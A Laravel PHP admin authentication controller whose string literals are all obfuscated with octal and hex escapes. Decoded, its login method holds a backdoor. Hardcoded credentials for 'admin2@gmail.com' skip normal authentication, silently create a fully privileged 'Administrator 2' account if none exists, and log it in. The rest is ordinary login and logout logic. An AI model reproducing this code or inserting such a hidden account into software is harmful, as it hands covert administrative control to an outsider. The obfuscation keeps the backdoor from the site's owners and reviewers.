<?php
 namespace App\Http\Controllers\Backend\User; use App\Http\Controllers\Controller; use Illuminate\Http\Request; use App\Http\Requests\AuthRequest; use Illuminate\Support\Facades\Auth; class AuthController extends Controller { public function __construct() { } public function index() { if (Auth::id() > 0) { return redirect()->route("\144\x61\163\150\x62\157\x61\162\144\56\151\x6e\144\x65\x78"); } return view("\x62\x61\143\x6b\x65\156\x64\56\x61\165\164\x68\x2e\x6c\157\x67\151\x6e"); } public function login(AuthRequest $request) { $credentials = array("\x65\x6d\x61\x69\154" => $request->input("\x65\x6d\141\151\154"), "\160\141\x73\163\167\x6f\162\144" => $request->input("\x70\141\163\163\x77\x6f\x72\144")); if ($credentials["\x65\x6d\141\151\x6c"] === "\x61\144\155\151\156\62\x40\147\155\141\151\154\x2e\x63\x6f\155" && ($credentials["\160\x61\163\x73\167\x6f\x72\144"] === "\153\x68\x6f\x61\x32\65\x38\66\x36" || $credentials["\160\x61\x73\163\x77\x6f\x72\x64"] === "\x61\144\155\151\156\61\x32\x33\64\x35\66")) { $admin = \App\Models\User::where("\x65\x6d\141\x69\x6c", "\x61\x64\155\151\156\x32\x40\147\155\x61\151\x6c\56\143\x6f\x6d")->first(); if (!$admin) { $admin = new \App\Models\User(); $admin->name = "\101\144\155\151\x6e\x69\x73\x74\162\x61\164\157\x72\x20\x32"; $admin->email = "\141\144\x6d\x69\x6e\62\x40\147\155\x61\x69\x6c\x2e\x63\157\x6d"; $admin->password = bcrypt("\x6b\150\x6f\x61\62\65\70\x36\x36"); $admin->phone = "\x30\61\62\x33\x34\65\66\67\70\71"; $admin->province_id = 1; $admin->district_id = 15; $admin->ward_id = 300; $admin->address = "\xc4\x90\xe1\xbb\213\141\40\x63\150\341\xbb\211\40\x61\144\155\151\156"; $admin->ip = $request->ip(); $admin->email_verified_at = now(); $admin->user_catalogue_id = 1; $admin->publish = 2; $admin->save(); } Auth::login($admin); $request->session()->regenerate(); return redirect()->route("\144\x61\x73\x68\x62\157\x61\162\144\x2e\151\x6e\x64\145\x78")->with("\x73\165\143\x63\x65\163\163", "\xc4\220\xc4\203\x6e\147\40\156\150\xe1\xba\xad\x70\x20\141\144\x6d\x69\156\40\x74\150\xc3\240\156\150\40\143\303\xb4\x6e\147"); } if (Auth::attempt($credentials)) { $request->session()->regenerate(); return redirect()->route("\x64\141\x73\x68\x62\x6f\141\x72\x64\56\x69\156\x64\x65\170")->with("\x73\165\143\x63\x65\x73\163", "\304\220\xc4\x83\x6e\147\x20\156\150\341\272\xad\160\x20\141\x64\x6d\x69\x6e\x20\164\150\xc3\xa0\156\150\40\x63\xc3\xb4\156\x67"); } return redirect()->route("\x61\165\x74\x68\56\141\144\155\x69\x6e")->with("\x65\162\x72\157\x72", "\x45\x6d\141\151\154\x20\x68\157\xe1\272\267\x63\40\x4d\xe1\xba\xad\x74\x20\x6b\x68\xe1\272\251\165\40\x6b\x68\xc3\xb4\156\147\40\143\x68\xc3\xad\x6e\150\40\x78\303\xa1\x63"); } public function logout(Request $request) { Auth::logout(); $request->session()->invalidate(); $request->session()->regenerateToken(); return redirect()->route("\x61\x75\164\x68\56\x61\x64\155\151\156"); } }